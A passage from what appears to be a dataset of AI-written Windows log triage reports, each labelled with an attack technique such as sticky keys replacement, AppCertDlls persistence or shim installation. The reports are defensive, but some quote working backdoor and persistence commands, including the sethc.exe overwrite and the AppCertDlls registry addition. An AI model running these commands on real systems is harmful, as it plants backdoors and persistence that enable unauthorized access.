   - Multiple executions of `cmd.exe`, `net.exe`, and `net1.exe` performing operations to add and potentially configure the `data.001_CMD` account. This is often where unauthorized or malicious actions take place on systems.
   - These processes were run by `SERVER002\admin_test`, showcasing a potential misuse or compromise of this user account.

4. **No PowerShell Logs**:
   - The absence of PowerShell operational logs could be an indicator that logs are being tampered with or being cleaned to hide activity, especially given the noted creation of a user account via command-line input, which might typically involve scripting commands.

5. **Activity Correlation**:
   - Network-based activity or connections relating to this activity are absent, suggesting a lack of corroboration or masking.

#### Assessment:

Evaluating the above findings, there are clear signs of potentially malicious behavior:
- The combination of time manipulation events, unauthorized user account creation, and elevated privileges associated with `admin_test`, coupled with the absence of PowerShell activity, suggests attempts to conceal unauthorized access and modifications.
  
#### Conclusion and Guidance:

**Resolution: MALICIOUS**

The activities captured in the logs, particularly the creation and manipulation of user accounts and system privilege changes without apparent legitimate cause, indicate a likely security compromise involving `Server002`. 

#### Recommendations:
1. **Immediate Investigation**: Conduct a detailed forensic analysis focusing on the `admin_test` account activities, including reviewing any recent changes to critical system files and authentication logs.
  
2. **Account Security**: Verify and potentially reset credentials for all privileged accounts; consider isolating `Server002` for further analysis.

3. **Verify System Integrity**: Use integrity-check tools to verify the contents of system binaries and configuration files, as well as checking for rootkits or similar malware.

4. **Review and Harden Security Policies**: Ensure strict auditing, minimize privileges, and enforce a robust monitoring layer to mitigate future risks.

5. **Contain and Remediate**: Isolate and review any configurations of `data.001_CMD` and any associated tasks or scheduled actions on `Server002`.

These actions will help prevent further unauthorized access while providing a clearer picture of the intrusion scope and impact."
Replace binary of sticky keys,"**Detailed Log Analysis:**

Upon examining the Sysmon, System, Application, and Windows PowerShell logs, the following observations were made:

1. **Sysmon Logs:**
   - A **whoami.exe** process was executed, which typically indicates checking user identity. This could be benign, depending on context.
   - A **cmd.exe** process execution with a suspicious command line was noted:
     ```
     ""cmd.exe"" /c IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd ) & takeown /F C:\Windows\System32\sethc.exe /A & icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t & copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
     ```
   - This command indicates a classic sticky keys exploit, wherein the `sethc.exe` is replaced with `cmd.exe`, allowing command-line access with elevated privileges when sticky keys are invoked at the login screen. This is a known method to gain unauthorized access.

2. **Event Context:**
   - The `cmd.exe` invocation with high integrity level and the nature of the command strongly indicates an attempt to create a backdoor by setting `cmd.exe` as a sticky keys application.
   - Various other processes associated with Microsoft Edge Update were logged. These appear routine and do not stand out as abnormal in their context or execution patterns.

3. **Security Impact and Threat Assessment:**
   - The presence of the specific command aimed at modifying `sethc.exe` is an **indicator of compromise**. This modification typically provides unauthorized users with easy access to an elevated command prompt pre-authentication, which can lead to privilege escalation and other malicious activities.

**Resolution:**

- Based on the analysis, the activity in the logs is classified as **MALICIOUS** due to the attempted alteration of system files (`sethc.exe`) to exploit system features (sticky keys) for unauthorized access.

**Guidance:**
1. **Immediate Actions Required:**
   - Check `C:\Windows\System32\` for tampering of `sethc.exe` and compare hash values with a known good state.
   - Restore `sethc.exe` to its original state from a trusted source if tampered.
   - Investigate other points of access to determine if any unauthorized access occurred.
2. **Preventive Measures:**
   - Apply stricter endpoint monitoring and implement alerts for changes to critical system files.
   - Ensure robust access controls and use privilege access management solutions.
   - Conduct a full security audit and consider the deployment of enhanced threat detection solutions such as advanced endpoint protection.

**Conclusion:**
The logs indicate a likely compromise involving a sticky keys exploit attempt. Rapid incident response and remediation are recommended to mitigate potential threats."
Code Executed Via Excel Add-in File (XLL),"Upon reviewing the provided logs, several observations and potential indicators of suspicious behavior have been noted. Below is a detailed analysis of the logs with their respective significance:

1. **Security Log Analysis**:
   - Frequent `EventID: 4624` entries indicate successful logons. The logons of type `5` represent a service logon, commonly used by Windows services, and the `SYSTEM` account is legitimate for such actions.
   - `EventID: 4672` indicates privileges assigned to a new logon session. Seeing high-level privileges like `SeDebugPrivilege` is not unusual for the `SYSTEM` account, but it warrants attention if abuse of those privileges is suspected.
   - `EventID: 4798` frequently appears, which relates to enumerating local group membership information. This is relatively normal in a domain environment where services or applications need to perform group membership checks.

2. **Sysmon Log Analysis**:
   - PowerShell activity is notable with `powershell.exe` executing a script to register Excel add-ins (`excelxll_x64.xll`, `excelxll_x86.xll`). PowerShell usage for scripting automation and management tasks is common, but the script's content should be scrutinized further for legitimacy as it involves components in the Temp directory.
   - `wevtutil.exe` (Event Viewer Utility) and `conhost.exe` (Console Window Host) processes frequently executed by the `admin_test` user should be investigated further, especially if these commands were not expected or scheduled.
   - Applications like `MicrosoftEdgeUpdate.exe` executing multiple times indicate software update activities, which are typically benign; however, verify the scheduled tasks and update configurations to ensure they align with expected behavior.
   - The presence of `whoami.exe` and `hostname.exe` executions is standard for environments where user information or host details are queried but should match typical administrative activity for `admin_test`.

3. **Windows PowerShell Log Analysis**:
   - The PowerShell logs confirm the execution of the aforementioned PowerShell script involving Excel plug-ins, which solidifies the need to validate this activity as intended and authorized.

4. **Application Log Analysis**:
   - `Windows Defender` entries confirm it was active and not tampered with. 
   - An entry for `edgeupdate` process cessation is typical as it denotes the end of an update process cycle.

**Assessment**:
- **Benign Behavior**: The legitimate `SYSTEM` account and expected service logons are quite normal.
- **Suspicious Behavior**: The PowerShell script involving Excel add-ins and multiple invocations of system utilities (`wevtutil`, `conhost`) by `admin_test` raise suspicion and warrant further investigation to confirm their legitimacy.

**Resolution**: 
Based on the analysis, the logs exhibit `SUSPICIOUS` activity that merits further investigation. It is recommended to:
- Confirm with the user `admin_test` or associated management whether the PowerShell and system utility activities were intended.
- Review any scheduled tasks or scripts that might correspond with the observed activity.
- Conduct a detailed assessment of the script executed by PowerShell to rule out any unauthorized actions or potential compromises.
- Cross-reference with other system logs or security solutions for corroborating evidence of these actions.

These steps should help ascertain whether the suspicious activities are innocuous or indicate potential compromise."
Injecting a Macro into the Word Normal.dotm Template for Persistence via PowerShell,"**Analysis:**

1. **PowerShell Activity:**
   - The Sysmon and PowerShell logs indicate the execution of a PowerShell script by the user `SERVER002\admin_test`. The script involves interacting with the Windows registry to modify a setting related to Microsoft Word (""Trust access to the VBA project object model"").
   - This script also creates scheduled tasks using VBA macros, with the objective of executing the Calculator 'calc.exe' at a specified time daily. Manipulating VBA project settings and using PowerShell scripts for scheduling tasks can indicate malicious intent, particularly when such actions are unusual and not part of normal administrative tasks.
   - The context and set up of the PowerShell script involve potentially risky activities like document manipulation through hidden Word instances, which could be used to persist further malicious code or tasks.

2. **Process Activity:**
   - The processes `powershell.exe` and `conhost.exe` are standard Windows processes. However, their rapid execution, especially in conjunction with `wsmprovhost.exe` and unnamed registry changes involving privileged access, raise red flags under suspicious usage contexts.
   - The process chain analysis from Sysmon indicates that the PowerShell script was initiated by `wsmprovhost.exe`, which is typically a legitimate Windows process involved in remote management. However, in this sequence, it acts as a parent to suspicious PowerShell execution, signaling possible misuse.

3. **Microsoft Edge Update:**
   - Numerous entries relate to Microsoft Edge Update processes. These entries suggest routine background update operations and do not have the typical markers of malicious activity. However, given their timing alongside the PowerShell execution, they warrant monitoring but appear benign based on this provided snapshot.

4. **Outcome and Judgement:**
   - **MALICIOUS**: The PowerShell execution pattern, with potentially malicious scripts aimed at exploiting VBA functionalities, signifies a high likelihood of intended compromise or unauthorized access setups. Such actions could be aiming for persistence mechanisms or payload deployments via trusted applications.

**Guidance and Next Steps:**

1. **Immediate Isolation and Investigation:**
   - Isolate the affected host (`Server002`) from the network to prevent further potential spread or impact.
   - Deep dive into the activities of the `admin_test` account, checking recent password changes, interactive logons, and previous activities including any anomalous behavior or misuse of privileged access.

2. **Log Review and Analysis:**
   - Conduct a comprehensive review of related logs, including any missing security logs, to determine the full scope and impact.
   - Perform forensic analysis on flagged scripts or scheduled tasks to understand their complete functions and associated network connections or data exfiltrations.

3. **System and Network Hardening:**
   - Reinforce defensive measures by deploying enhanced monitoring, particularly for PowerShell executions and VBA actions, on this server and throughout the environment.
   - Review and configure Group Policies to restrict unauthorized changes to registry settings and task schedules.

4. **Reporting:**
   - Report the incident to relevant security teams within the organization for a coordinated response.
   - Engage end-user education initiatives to strengthen awareness about the risks concerning access to projects and scripting capabilities. 

This action plan outlines immediate control and follow-up actions to manage the identified threat while providing proactive strategies for enhanced security posture.
"
Simulate Patching termsrv.dll,"After thoroughly analyzing the provided Windows event logs, several noteworthy activities have been identified:

1. **Time Manipulation**: There are indications that the system time on the server was altered, as evidenced by entries with EventID 4616 and related kernel events. This kind of activity is often used to obscure the sequence of events on a system, which can be indicative of malicious intent.

2. **PowerShell Activity**: There is the execution of potentially malicious PowerShell commands, which indicates modification attempts on `termsrv.dll` (a DLL associated with Terminal Services). The PowerShell script adjusts file permissions, makes backups, modifies content, and attempts to replace the DLL with a backup. This action is reminiscent of tactics used to facilitate unauthorized remote desktop connections or bypass licensing restrictions.

3. **Elevated Privileges and Use of Administrative Accounts**: The logs show multiple instances of the user `admin_test` having administrative privileges and executing various system binaries, such as `whoami.exe` and `hostname.exe`, sometimes without a clear parent process, suggesting it might have been initiated directly and potentially at high privileges. This account is also seen to be executing PowerShell commands with a high integrity level.

4. **Unusual Process Executions**: Processes like `wsmprovhost.exe` and `conhost.exe` are run by `admin_test`, which under normal circumstances should not exhibit any unusual behavior but in this case are associated with user-aware processes and might suggest a reconnaissance or preparatory stage for further attacks.

5. **Sysmon Event Patterns**: The frequent execution of system binaries such as `wevtutil.exe`, and `hostname.exe` and their relation to different `conhost.exe` sessions could indicate scripted interactions, indicating automation or batch scripts execution for reconnaissance or cleanup purposes.

### Assessment and Resolution:

Given the evidence of unauthorized manipulation of time settings, the execution of potentially harmful PowerShell scripts, and administrative activities without verified intent, there is a strong indication of suspect activity.

**Resolution: SUSPICIOUS**

### Guidance:

1. **Further Investigation**:
   - Investigate the recent actions of the `admin_test` account, including comprehensive assessments of access logs and any other privileged account usage.
   - Examine any related systems or logs where the `admin_test` or associated IP addresses (`fe80::e3b5:5371:12a8:9c77` and `192.168.0.102`) have been used.
   - Perform integrity checks on `termsrv.dll` and other critical system files for unauthorized modifications.

2. **Protection Measures**:
   - Implement additional monitoring, especially for privileged account activities and use of scripting tools like PowerShell.
   - Ensure time-synchronization protocols and services are securely configured and monitored for anomalies.

3. **Immediate Actions**:
   - Temporarily restrict or monitor `admin_test` account access and reset its credentials under supervision.
   - Review and if necessary, re-enable security permissions on DLLs and other critical system files through verified channels.

The logs suggest an early stage of compromise or a preparation for unauthorized remote access. Proceed with caution, and ensure an updated defense strategy moving forward."
Install and Register Password Filter DLL,"After analyzing the provided Windows event logs, here is a detailed assessment of the situation:

### Summary Analysis:

#### Windows PowerShell Logs:
1. **PowerShell Activity:**
   - Several PowerShell events indicate the execution of a script that performs the following actions:
     - Exports the LSA (Local Security Authority) configuration from the registry to a temporary file.
     - Copies a DLL file to the System32 directory.
     - Modifies the ""Notification Packages"" in the LSA registry key.
   - **Suspicious Elements:**
     - The script involves handling password filters and modifying ""Notification Packages,"" suggesting potential credential theft or privilege escalation activity.
     - Copying a DLL to System32 directory is typically suspicious and requires further investigation.

#### Sysmon Logs:
1. **Process Creation and Execution:**
   - Legitimate processes like `powershell.exe`, `whoami.exe`, and others are seen executing with an account named ""SERVER002\\admin_test.""
   - The presence of other processes like `wevtutil.exe`, and `reg.exe` with suspicious command lines related to registry export and DLL operations.
   - The frequent execution of Microsoft Edge Update processes, which might be legitimate (related to automatic updates) but require confirmation to rule out tampering or misuse by malicious actors.

2. **Integrity Level:**
   - Processes having ""High"" integrity levels and running under ""SERVER002\\admin_test,"" which might have administrative privileges.

#### Security Logs:
1. **Privileged Logons and Operations:**
   - Several events related to privileges such as `SeDebugPrivilege`, `SeLoadDriverPrivilege` are observed, which could indicate attempts to undertake administrative tasks or bypass certain security controls.

### Evaluation and Conclusion:

Considering the above points, the activity reflected in the logs contains several **suspicious** elements, notably:

- The advanced manipulation involving registry and security-sensitive areas like LSA and DLLs.
- The presence of high-integrity level processes and execution of scripts potentially aimed at privilege escalation.
- The privileged operations conducted with potentially administrative accounts.

### Resolution Assessment:
- **Resolution:** **SUSPICIOUS**

### Guidance for Next Steps:
1. **Isolate the Host:**
   - If possible, isolate the affected host from the network to prevent potential spread or further unauthorized access.
   
2. **Conduct a Forensic Investigation:**
   - Determine if the DLL introduced in the System32 directory is legitimate. Check its origin and whether it is signed by a trusted source.
   - Validate the changes made to LSA registry keys and assess the impact on system security.
   
3. **User Account Verification:**
   - Verify the account ""SERVER002\\admin_test"" to confirm it should have such access and investigate any potential misuse.
   
4. **Review Edge Update Activity:**
   - Confirm whether reported processes related to Edge Update are scheduled/automatic updates or if there is an anomaly.

5. **Advanced Threat Detection:**
   - Use advanced threat detection tools to look for compromise indicators across other systems in the network.

This investigation reveals potentially malicious activity with concerning PowerShell execution patterns and process modifications, warranting a deeper forensic approach."
Application Shim Installation,"In my detailed analysis of the provided Windows event logs, I focused primarily on the Sysmon logs, as they include critical data on process creation, command-line details, and other indicators that might unveil any potential malicious activity.

**Key Observations:**

1. **Process Execution**:
   - **PowerShell Execution**: At 14:11:53, there is a record of `powershell.exe` running by the user `SERVER002\admin_test`. PowerShell is legitimate but commonly used by attackers for lateral movement or execution of malicious scripts, especially if not typically required by the user or in an unexpected context.
   
   - **Command Shell (cmd.exe) Usage**: Shortly after the PowerShell execution, there are records of `cmd.exe` at 14:11:54 executing `sdbinst.exe` with a path to a temporary directory: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.011\bin\fileShimx86.sdb`. This directory's use and the `sdbinst.exe` command suggest potential attempts to install an application compatibility database, which can be misused for persistence or bypasses.

2. **Wevtutil and Sdbinst Executions**: Throughout the logs, `wevtutil.exe` and `sdbinst.exe` are executed. `Wevtutil` is used to manage event logs and can be leveraged to evade detection by clearing logs. The running of `sdbinst.exe` is typically used for database installation for application compatibility but is also known to be used for exploits.

3. **Whoami Execution**: The use of `whoami.exe` indicates someone or something is verifying user credentials or context. This is somewhat common for scripts but paired with prior events could imply reconnaissance activities.

4. **Microsoft Edge Update Process**: Various processes indicate Microsoft Edge updates (both installations and updates). These seem legitimate, especially given their execution by `NT AUTHORITY\SYSTEM`. However, consistent and abnormal updates or installations might need validation against scheduled updates.

5. **Application and Service Activity**: Security logs primarily display service stops related to edgeupdate and SPP, which align with the observations in the Sysmon log. There are no apparent abnormal entries in the Application log.

**Assessment and Recommendations:**

- **Assessment**: The behavior observed can appear suspicious primarily due to the use of PowerShell executing followed by cmd.exe script execution installing an sdb file from a Temp directory, and wevtutil usage. There is evidence of possible reconnaissance and potential persistence techniques, pointing toward activities of interest.
  
- **Resolution: SUSPICIOUS**: The events, specifically the usage of PowerShell, cmd.exe with `sdbinst`, and `wevtutil` warrant further investigation to confirm their legitimacy. There is no definitive proof of malware, but the behavior aligns with common attack vectors that could indicate compromise.

- **Guidance**:
   1. Verify the legitimacy of the `powershell.exe` and `cmd.exe` commands; check if they match any scheduled tasks or known scripts.
   2. Investigate the user `SERVER002\admin_test` to determine if this activity aligns with their normal duties.
   3. Confirm the legitimacy of the sdb file (`fileShimx86.sdb`) and analyze it.
   4. Ensure wevtutil's usage is verified against administrative activities or legitimate system management actions.
   5. If unusual activities continue, implement additional monitoring or alerting around this behavior particularly related to `powershell.exe` and `cmd.exe` activities on `SERVER002`.

This further investigation will determine if a full incident response is warranted or if these activities can be safely attributed to benign use."
WMI Invoke-CimMethod Start Process,"### Detailed Analysis

Upon reviewing the provided logs, a number of events stand out as potentially suspicious and require further investigation:

#### Security Log Observations:
1. **Event ID 4616**: There are recurring `Time Change` events where the system time was changed backwards. This could indicate an attempt to manipulate logs or timestamps to cover malicious activity. The involved process is `svchost.exe`, which is a legitimate Windows process, but its use here could be suspicious if it has been modified or used for unauthorized changes.

2. **Event ID 4672**: This event records special privileges assigned to a new logon session for user `admin_test`. The privileges include `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, etc. Such high-level privileges are typically not required during standard operations, pointing to potential misuse or escalation of privileges.

3. **Event ID 4624 and 4634**: These events detail a logon and logoff, respectively, for `admin_test` with logon type 3, which is a network logon. The use of NTLM authentication (a less secure protocol) and the presence of high privileges could indicate an unauthorized network session.

#### Sysmon Log Observations:
1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`**: `wevtutil.exe` is used to manage event logs, and `conhost.exe` is a known legitimate process. However, the repeated execution by `admin_test` could imply log tampering or command execution within a command-line environment, which should be further investigated.

2. **Event ID 1**: The execution of PowerShell with specific command-line arguments that aim to remotely start `calc.exe` using credentials is indicative of unauthorized scripting or malicious automation.

#### PowerShell Log Observations:
1. **PowerShell Script**: The script provided in the PowerShell logs includes commands to create a CIM session with the remote machine using plaintext credentials. This usage is highly suspicious as it indicates an attempt at remote management, possibly without the target machine owner’s consent or knowledge.

#### Application and System Log Observations:
1. **Event ID 35 (Time Service)**: This confirms changes in time settings, aligning with suspicious timestamp manipulations observed in the security logs.

2. **System Event Logs**: Changes to system time without apparent justification are suspicious and imply potential log tampering activities or evasion of detection mechanisms.

### Threat Assessment and Recommendations

Based on the logs reviewed, the combination of unauthorized privilege escalation, potential time manipulation, repeated execution of management utilities possibly for evasion or malicious purposes, and suspicious PowerShell scripting usage strongly indicates a possible breach or unauthorized activity. 

The presence of plaintext passwords and high-privilege operations executed under the `admin_test` account suggest the potential for compromised credentials or misuse of administrative privileges. 

### Resolution: **MALICIOUS**

Given the evidence of privileges misuse, suspicious scripting, potential time manipulation, and unauthorized session activity, the activity in these logs is deemed **MALICIOUS**.

### Guidance:

1. **Immediate Actions**:
   - Block the involved user account `admin_test` until further notice.
   - Change credentials for all accounts and review recent administrative changes.
   - Isolate the affected machine from the network for a detailed forensic analysis.

2. **Forensic Steps**:
   - Conduct a deep dive into system changes and identify any unauthorized installations or scripts.
   - Examine network logs to trace potential data exfiltration or lateral movements.
   - Review and correlate firewall logs and intrusion detection systems for external indicators related to these events.

3. **Preventive Measures**:
   - Implement stricter policies for time change controls.
   - Enforce stronger authentication methods (use Kerberos instead of NTLM where applicable).
   - Limit administrative privileges and routinely audit privileged accounts.
   - Use Endpoint Detection and Response (EDR) tools for future threat detection and advanced monitoring."
Create registry persistence via AppCert DLL,"Upon review of the provided log entries, the following analysis is conducted:

1. **Suspicious PowerShell Activity**:
   - There's a PowerShell command that executes unusual operations involving the copying of a DLL (`fileTest.dll`) and modifying the registry under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls`.
   - The activity is designed to forcefully copy the DLL and register it using `AppCertDlls`, which can be indicative of a method employed by malware for persistence or to hook into processes.
   - The executed command is: 
     ```powershell
     powershell.exe & {Copy-Item \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.009\\bin\\fileTest.dll\"" C:\\Users\\Public\\fileTest.dll -Force, reg add \""HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\"" /v \""fileTest\"" /t REG_EXPAND_SZ /d \""C:\\Users\\Public\\fileTest.dll\"" /f, if($false){Restart-Computer}}
     ```
   - This indicates an attempt to alter system behavior, which is consistent with malicious activity.

2. **Registry Modification**:
   - The use of `reg.exe` to add a registry entry is aligned with the PowerShell activity, corroborating the suspicious nature of the behavior.

3. **General System Activities**:
   - The logs indicate other routine processes such as Edge Updates and typical system services starting and stopping, which are not inherently suspicious.

**Assessment**:
- Based on the PowerShell activity and the registry manipulation, these logs contain strong indicators of potentially malicious activity. The specific use of `AppCertDlls` is a known technique for malware persistence.

**Resolution**:
- **MALICIOUS**: The behavior observed (registry modification for persistence and DLL usage) strongly suggests malicious intent.

**Guidance on How to Proceed**:
- Isolate the affected host to prevent further potential spread of malicious activities.
- Analyze `fileTest.dll` for malicious code or behavior.
- Review additional logs and system changes concurrent to this event for further malicious actions or persistence mechanisms.
- Conduct a full scan of the system with updated antivirus and endpoint protection tools.
- Consider implementing tighter restrictions on PowerShell use and registry modifications via Group Policies or security solutions.
- Notify the incident response team for further investigation and possible remediation actions."
Persistence via WMI Event Subscription - CommandLineEventConsumer,"Based on the provided logs, here is a detailed analysis focusing on indicators of suspicious or malicious activities:

### Analysis

#### System Log
- **Time Adjustments:** Numerous `EventID: 1` and `EventID: 24` indicate time adjustments and synchronization, common during daylight saving time changes or system adjustments. These adjustments are often recorded by svchost.exe when the time service is running. In isolation, these events don't indicate malicious activity.

#### Security Log
- **Logon Event (ID 4624) and Privilege Use (ID 4672):** Standard logon events indicating the local system account (SYSTEM) acquiring privileges. The privileges listed are high-level (e.g., SeDebugPrivilege, SeTakeOwnershipPrivilege) and are typical for the SYSTEM account.
- **Time Change Event (ID 4616):** Associating with previous time events. The time change operation is conducted by svchost.exe, likely tied to the Windows Time service.

#### PowerShell Log
- **WMIPersistence Execution:** PowerShell activity references a WMI event subscription that creates persistence (`__InstanceModificationEvent` with filters targeting system up time). The script involves `CommandLineEventConsumer` setting to execute `notepad.exe`, which is suspicious for two reasons:
  - WMI Event Subscription is a known persistence mechanism.
  - Notepad.exe as a target process in an event consumer is unusual and may indicate testing or placeholder for a potentially malicious payload.

#### Sysmon Log
- **Process Execution:**
  - Various Microsoft Edge Update processes (MicrosoftEdgeUpdate.exe and related executables) show numerous executions and typical for updating applications.
  - Presence of `whoami.exe` could indicate account information gathering; however, executed by the `admin_test` user, it could be legitimate.
  - Regular system utility executions (e.g., `conhost.exe`, `wevtutil.exe`) as expected in a Windows environment.

#### Application Log
- Mostly benign entries related to routine system and Edge update operations. No immediate indications of compromise are identifiable.

### Assessment and Resolution

1. **Suspicious Activity Identified:**
   - The use of PowerShell to establish WMI persistence is a notable suspicious activity. Such tactics are used by attackers to maintain access within a system covertly.
   - Actions within the PowerShell logs require further analysis to confirm whether this is benign administrative activity or unauthorized persistence.

2. **Guidance and Next Steps:**
   - Conduct further investigation into the source of the PowerShell command and the purpose behind the WMI persistence mechanism.
   - Review the administrator activities to see if this could be part of a legitimate testing or maintenance process.
   - Conduct threat hunting across other systems to see if similar patterns emerge, potentially indicating broader compromise.

**Final Resolution: SUSPICIOUS**

Given the context and details, the WMI persistence attempt elevates the activity to suspicious. Further investigation is crucial to determine the nature and intent behind this PowerShell activity."
New shim database files created in the default shim database directory,"### Detailed Analysis:

Upon reviewing the provided logs, several key activities stand out that warrant closer scrutiny:

1. **PowerShell Activity:**
   - The PowerShell logs indicate the execution of commands involving the copying of a file named `data.011CompatDatabase.sdb` from a temporary location to the Windows `apppatch` directory. This operation is captured in multiple PowerShell events spanning from EventRecordID 1043 to 1048.
   - This activity is unusual because it involves using PowerShell to manipulate files in sensitive system directories, commonly seen in behaviors associated with malware or attackers trying to exploit compatibility mechanisms.

2. **Process Creation:**
   - The Sysmon logs show several events related to processes like `whoami.exe`, `wevtutil.exe`, and `powershell.exe`. Specifically, `wevtutil.exe` is used for exporting logs as indicated by the command line: `""C:\\Windows\\system32\\wevtutil.exe"" epl Microsoft-Windows-Sysmon/Operational C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\TempLog.evtx`.
   - The file movement of an `SDB` file and subsequent use of PowerShell aligns with patterns of persistence or privilege escalation attempts. The execution context is shown to be under a high-integrity level, which suggests potential misuse of administrative privileges.

3. **Unusual Command Lines:**
   - The whoami and conhost processes triggered follow-up processes indicative of potential investigation or lateral movement by accessing user and session information.
   - Notably, the `wevtutil.exe` process up to EventRecordID 18016 suggests log tampering or evasion efforts. Exporting and potentially clearing logs could be an attempt to hide tracks.

4. **High Integrity and System-Level Processes:**
   - Many processes run at a high integrity level, indicating they were executed with administrative privileges.
   - Various Microsoft Edge update processes and their command lines show routine software updates, which on their own might appear benign, but in combination with PowerShell activity, they could be camouflage for unauthorized activity.

5. **Absence of Security Logs:**
   - No specific security logs are provided, which means potential security alerts or anomalies logged there are unavailable for assessment. This is noteworthy itself if the logs were intentionally disabled or tampered with.

### Assessment of the Situation:

Based on the evidence, the sequence of operations, particularly the use of PowerShell to copy a compatibility database file and subsequent actions involving system directories and log exporting, point towards behavior that is suspicious and potentially malicious. The execution context, which shows administrative privileges and high integrity level actions without clear justification, heightens concern.

### Resolution:

**Resolution: SUSPICIOUS**

Given the activities observed:
- The PowerShell script that targets system directories.
- The process creation and execution under high integrity levels.
- The log export activity, combined with the lack of security log entries.

These activities require further investigation to ascertain intent and to check for signs of actual compromise or the presence of malicious actors. Additional steps should include:
- Conduct a thorough review of system changes and verify the legitimacy of applications affected.
- Run comprehensive malware scans and behavioral analysis across the system.
- Establish stronger monitoring around administrative activities and enforce least privilege principles.
- Ensure the collection and review of comprehensive logs, especially concerning security logs for any anomalies."

- Consistent with the Edge update process observed in Sysmon logs.
- **Assessment**: Benign. Indicative of normal update activities.

#### Security Log Analysis
- Time synchronization events logged similarly in the System logs, involving `svchost.exe`.
- **Assessment**: Benign. Routine activity for time service adjustment.

### Conclusion and Recommendation

- **Overall Resolution**: **SUSPICIOUS**
- The primary item of concern is the use of `cmd.exe` to modify a registry key related to the Terminal Server Client. This activity could indicate an attempt to configure system settings in a way that could facilitate persistence or avoidance of security measures. However, without further context or investigation, this cannot be definitively labeled as malicious.
- **Recommended Action**:
  1. Investigate the origin and intent of the suspicious registry modification.
  2. Check for any related alerts, unusual network activity, or user reports of abnormal behavior.
  3. Consider monitoring or restricting registry access via Group Policy for the `admin_test` user.
  4. Determine if this activity corresponds to a legitimate administrative task or a schedule/process that may have caused these changes.
  5. If further investigation supports malicious intent, conduct a thorough forensic analysis to identify potential threats or compromises."
Bitsadmin Download (PowerShell),"Upon analyzing the provided event logs, several points of interest have been identified:

### Suspicious or Anomalous Behavior:

1. **PowerShell Activity**:
   - There are multiple PowerShell events where the command `Start-BitsTransfer` is used to download a script from a URL (`https://raw.githubusercontent.com/file/file-file/master/files/data/data.md`) to a temporary location (`$env:TEMP\\bitsadmin2_flag.ps1`). This behavior is suspicious for several reasons:
     - Downloading scripts from the internet using PowerShell can be indicative of a script-based attack or payload delivery mechanism.
     - The usage of `Start-BitsTransfer` is often associated with transferring files covertly.

2. **Frequent Process Creation (Wevtutil and Conhost)**:
   - Numerous events involve the processes `wevtutil.exe` and `conhost.exe` running under the `SERVER002\\admin_test` user account. Without specific command lines or context, while `wevtutil` is used for event log management, repeated invocations can sometimes be used to tamper with or clear logs.
   - The frequent use of `conhost.exe` suggests some backend command-line interface operations, possibly related to the PowerShell execution.

3. **Microsoft Edge Update**:
   - The repeated instances of `MicrosoftEdgeUpdate.exe` execution with different command-line arguments such as `/svc`, `/regsvc`, `/regserver`, and `/ua` seem consistent with typical update operations, but the rapid sequence of occurrences raises a slight suspicion. However, update processes can perform multiple actions quickly under legitimate circumstances.

### Assessment and Findings:
- **Edge Update Operations** may be legitimate, although the sheer volume of related events seems excessive. Given that Microsoft Edge performs updates regularly, there’s still a chance this could be benign, albeit worth keeping an eye on to ensure no tampering/modification occurs in these processes over time.
  
- **PowerShell Activity** stands out as potentially malicious due to the script download operation from a public URL that could be unauthorized. The presence of this operation warrants further investigation to determine the legitimacy and content of the downloaded script.

### Conclusion:
Based on the above analysis, there are signs of potentially suspicious activity that require additional investigation, primarily focusing on the PowerShell events and the contents of the downloaded script:

**Resolution: SUSPICIOUS**

### Recommendations:
1. **Investigate PowerShell Script**: 
   - Review the script located at `$env:TEMP\\bitsadmin2_flag.ps1` to ascertain its purpose and determine if it poses any security risk.
   - Confirm if this PowerShell activity was sanctioned or part of a legitimate administrative task.

2. **Review User Activity**:
   - Verify the activities of the `admin_test` account around the time of these events to rule out any unauthorized use or compromise.
   
3. **Monitor Edge Update Processes**:
   - Ensure that the Microsoft Edge update process is occurring as expected and matches known behavior for updates.
   
4. **Enhance Monitoring**:
   - Consider implementing additional monitoring rules for suspicious PowerShell usage and unusual wevtutil activities to capture any further anomalous actions promptly."
Install AppInit Shim,"## Detailed Analysis

### Security Log

1. **Logon Events (4624, 4672)**
   - EventID 4624 indicates successful logons. The entries show logons by the `SYSTEM` account on `Server002` with a logon type of 5, indicating a service startup. This activity is typically benign and expected on a server as services start.
   - EventID 4672 shows special privileges assigned to `SYSTEM`. The list includes administrative privileges that SYSTEM normally has. Nothing appears unordinary here.
   - Events are consistent with normal service behavior but should be cross-verified with expected service start times.

2. **Credential Validation (5379)**
   - Events indicate credential validation attempts failing with ReturnCode 3221226021 (STATUS_LOGON_FAILURE). The target name is `MicrosoftAccount:user=02txoixylodcstop`.
   - Multiple login failures could be a failed automated login attempt or a potential brute force attempt. These require further investigation to ensure it’s not a brute force attack.
   
3. **Account Enumeration (4798)**
   - This event logs account enumeration actions (SID resolution).
   - `taskhostw.exe` invoked these events, which is a known legitimate process, but the context of usage should be explored further to ensure it’s not part of unauthorized activity or privilege escalation.

### Sysmon Log

1. **Command Execution (EventID 1)**
   - Powershell, wevtutil, conhost, and other utilities like whoami, reg.exe are executed via `admin_test` user. Powershell execution needs further context to determine its purpose.
   - Command-line entry importing a registry file using reg.exe is suspicious in this context, as this could be part of a persistence mechanism. Review this registry file and its contents to ensure it doesn’t introduce unauthorized modifications.

2. **Edge Update Processes**
   - Microsoft Edge update processes (`MicrosoftEdgeUpdate.exe`) are executed multiple times, usually appearing legitimate (due to Microsoft’s identification), but ensure they align with scheduled updates and no tampering has occurred.

### Application Log

1. **Edge Update Service**
   - Events show that the Edge update service stopped, which might align with system maintenance routines or updates. Verify against update schedules.

### Final Assessment
1. **Suspicious Indicators**
   - The frequent credential validation failures should be flagged for closer analysis to ensure no breach attempts. These could simply be misconfigured applications or user error, but they should not be dismissed without ensuring their legitimacy.
   - The registry modification deserves detailed inspection to prevent potential malicious action.

### Resolution
